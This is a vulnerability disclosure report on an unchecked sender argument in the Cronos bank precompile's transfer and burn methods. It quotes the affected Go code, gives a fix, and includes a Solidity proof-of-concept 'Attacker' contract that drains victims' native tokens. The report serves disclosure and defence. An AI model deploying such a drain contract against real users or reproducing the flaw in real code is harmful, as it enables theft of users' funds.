### Title
Unchecked `sender` Argument in Bank Precompile `transfer` Allows Any Contract to Drain Victims' Native Bank Tokens — (`File: x/cronos/keeper/precompiles/bank.go`)

### Summary

The `transfer` case in `BankContract.Run` accepts a caller-supplied `sender` address from ABI-decoded input and uses it as the debit account for a native bank `SendCoins` call, without ever verifying that `contract.Caller()` matches that `sender`. Any EVM contract can therefore call the bank precompile and move `evm/<contract_address>`-denominated native tokens out of any victim's account to an arbitrary recipient.

### Finding Description

`BankContract.Run` in `x/cronos/keeper/precompiles/bank.go` handles four methods. For `transfer` (lines 167–200):

```go
sender    := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)
amount    := args[2].(*big.Int)
from      := sdk.AccAddress(sender.Bytes())
to        := sdk.AccAddress(recipient.Bytes())
// ...
denom := EVMDenom(contract.Caller())    // evm/<calling_contract>
// ...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

`denom` is correctly derived from `contract.Caller()` (the EVM address of the calling contract), so the attacker can only move tokens of denom `evm/<their_contract>`. However, `from` is taken verbatim from the ABI input with **no check that `contract.Caller() == sender`**. There is no equivalent guard anywhere in the method.

The intended usage, shown in `integration_tests/contracts/contracts/TestBank.sol` lines 35–38, is for a CRC20 contract to pass `msg.sender` as the first argument:

```solidity
function nativeTransfer(address recipient, uint256 amount) public returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return bank.transfer(msg.sender, recipient, amount);  // correct: msg.sender == sender
}
```

A malicious contract omits this constraint and passes an arbitrary victim address instead.

The same structural flaw exists in the `burn` case (lines 143–149): `addr` is taken from `args[0]` and used as the account to `SendCoinsFromAccountToModule` (i.e., burned from), again without verifying the caller is authorized to burn from that account.

### Impact Explanation

**Critical — Unauthorized transfer of CRC20/CRC21-associated native bank tokens.**

Users who call `moveToNative` (or any equivalent function) on a CRC20 contract that uses the bank precompile receive `evm/<contract_address>` native bank tokens. A malicious contract at address `0xEVIL` can call:

```
bank.transfer(victim_address, attacker_address, victim_balance)
```

This executes `bankKeeper.SendCoins(ctx, victim, attacker, coins)` for denom `evm/0xEVIL`, draining the victim's entire native bank balance of that token with no approval or signature from the victim. The attacker receives real, transferable native Cosmos-layer tokens.

This maps directly to the allowed Critical impact: *"Unauthorized … transfer … for … CRC20, CRC21, ERC20, or precompile-controlled assets."*

### Likelihood Explanation

- Deploying a contract on Cronos EVM is permissionless; no admin or governance action is required.
- The attacker only needs to deploy a contract that calls the bank precompile with a victim's address as `sender`.
- Any user who has ever called `moveToNative` (or equivalent) on the attacker's contract holds `evm/<attacker_contract>` tokens and is immediately at risk.
- The attack is a single EVM transaction; no off-chain coordination or leaked keys are needed.

### Recommendation

In the `TransferMethodName` case, add a caller-equality check before executing the bank send:

```go
if contract.Caller() != sender {
    return nil, errors.New("transfer: caller is not the sender")
}
```

Equivalently, remove the `sender` argument entirely and derive `from` from `contract.Caller()`, mirroring how `denom` is already derived. Apply the same fix to the `BurnMethodName` case, where `addr` (the account to burn from) should also be validated against `contract.Caller()`.

### Proof of Concept

1. Deploy a malicious contract `Attacker` on Cronos EVM:

```solidity
interface IBankModule {
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
    function balanceOf(address token, address addr) external view returns (uint256);
}

contract Attacker {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 2: drain victim's evm/<address(this)> native tokens
    function drain(address victim, address attacker) external {
        uint256 bal = bank.balanceOf(address(this), victim);
        require(bal > 0, "nothing to drain");
        bank.transfer(victim, attacker, bal);
    }
}
```

2. Induce victim to call a `moveToNative`-style function on `Attacker` (or any function that calls `bank.mint(msg.sender, amount)`), giving the victim a balance of `evm/<Attacker>` native tokens.

3. Call `Attacker.drain(victim, attacker)`. The bank precompile executes `bankKeeper.SendCoins(ctx, victim, attacker, coins)` for denom `evm/<Attacker>` with no authorization check, transferring the victim's entire native balance to the attacker.

The root cause — `sender` taken from ABI input without validating `contract.Caller() == sender` — is confirmed at: [1](#0-0) 

The denom derivation (correct) vs. the sender derivation (unchecked) side-by-side: [2](#0-1) 

The intended safe usage pattern (passing `msg.sender`) that the precompile fails to enforce: [3](#0-2)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L175-192)
```go
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
```

**File:** integration_tests/contracts/contracts/TestBank.sol (L35-38)
```text
    function nativeTransfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return bank.transfer(msg.sender, recipient, amount);
    }
```
